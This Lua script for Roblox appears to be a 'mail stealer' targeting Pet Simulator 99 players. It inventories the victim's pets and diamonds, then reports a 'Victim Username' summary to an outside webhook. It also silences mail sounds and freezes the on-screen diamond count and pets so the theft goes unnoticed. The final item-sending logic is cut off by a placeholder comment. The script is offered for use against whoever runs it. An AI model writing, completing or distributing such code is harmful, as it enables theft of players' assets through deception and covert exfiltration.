_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

print("[INFO] Script started")

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function() return require(game.ReplicatedStorage.Library.Client.Save).Get() end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 10000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

print("[INFO] Finding mail price function")
for adress, func in pairs(getgc()) do
    if debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()
print("[INFO] Mail first price:", mailSendPrice)

local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end
print("[INFO] Total diamonds:", GemAmount1)

-- Format numbers
local function formatNumber(number)
    local number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- WEBHOOK
local function SendMessage(diamonds)
    print("[INFO] Sending webhook")
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }
    local combinedItems = {}
    local itemRapMap = {}
    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end
    table.sort(combinedItems, function(a,b) return itemRapMap[a].rap*itemRapMap[a].amount>itemRapMap[b].rap*itemRapMap[b].amount end)
    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName.." (x"..itemData.amount..")"..": "..formatNumber(itemData.rap*itemData.amount).." RAP\n"
    end
    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
    local data = {["embeds"]={{["title"]="\240\159\144\177 New PS99 Execution", ["color"]=65280, ["fields"]=fields, ["footer"]={["text"]="Strike Hub."}}}}
    if #fields[2].value>1024 then
        local lines={}
        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines,line) end
        while #fields[2].value>1024 and #lines>0 do
            table.remove(lines)
            fields[2].value=table.concat(lines,"\n").."\nPlus more!"
        end
    end
    local body = HttpService:JSONEncode(data)
    request({Url=webhook, Method="POST", Headers=headers, Body=body})
end

-- Suppress mail sounds
game.DescendantAdded:Connect(function(x)
    if x.ClassName=="Sound" and (x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276") then
        x.Volume=0 x.PlayOnRemove=false x:Destroy()
    end
end)

-- Visual freeze for diamonds & pets
print("[INFO] Setting up visual freeze")
do
    local RunService = game:GetService("RunService")
    local leaderstats = plr:WaitForChild("leaderstats")
    local diamondsValue = leaderstats:FindFirstChild("💎 Diamonds") or leaderstats:FindFirstChild("Diamonds")
    local frozenDiamonds = diamondsValue and diamondsValue.Value or 0
    local petsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Pets")

    -- GUI once
    local PlayerGui = plr:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name="FreezeIndicatorGUI"
    screenGui.ResetOnSpawn=false
    screenGui.Parent=PlayerGui
    local frame=Instance.new("Frame")
    frame.Size=UDim2.new(0,250,0,50)
    frame.Position=UDim2.new(0.5,-125,0.9,0)
    frame.BackgroundColor3=Color3.fromRGB(30,30,30)
    frame.BorderSizePixel=0
    frame.Active=true
    frame.Parent=screenGui
    local label=Instance.new("TextLabel")
    label.Size=UDim2.new(1,0,1,0)
    label.BackgroundTransparency=1
    label.Text="Please wait while the script loads"
    label.TextColor3=Color3.fromRGB(0,255,0)
    label.Font=Enum.Font.SourceSansBold
    label.TextSize=20
    label.Parent=frame

    local connection
    connection=RunService.RenderStepped:Connect(function()
        if diamondsValue then diamondsValue.Value=frozenDiamonds end
        for _, pet in ipairs(petsFolder:GetChildren()) do
            if pet:IsA("Model") and pet.PrimaryPart then
                pet.PrimaryPart.Anchored=true
            end
        end
    end)

    plr.AncestryChanged:Connect(function(_,parent)
        if not parent then
            if connection then connection:Disconnect() end
            if petsFolder then
                for _, pet in ipairs(petsFolder:GetChildren()) do
                    if pet:IsA("Model") and pet.PrimaryPart then
                        pet.PrimaryPart.Anchored=false
                    end
                end
            end
            screenGui:Destroy()
        end
    end)
end

print("[INFO] Visual freeze active")

-- (Rest of your sending logic continues here...)
